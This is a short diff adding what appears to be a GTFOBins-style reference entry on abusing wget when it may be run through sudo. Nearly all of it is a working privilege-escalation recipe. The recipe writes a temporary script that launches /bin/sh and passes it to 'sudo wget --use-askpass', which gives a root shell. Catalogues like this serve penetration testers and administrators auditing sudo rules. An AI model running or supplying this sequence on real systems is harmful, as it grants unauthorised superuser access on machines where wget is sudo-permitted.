@@ -1,0 +1,8 @@
+***** Sudo *****
+If the binary is allowed to run as superuser by sudo, it does not drop the
+elevated privileges and may be used to access the file system, escalate or
+maintain privileged access.
+    * TF=$(mktemp)
+      chmod +x $TF
+      echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
+      sudo wget --use-askpass=$TF 0
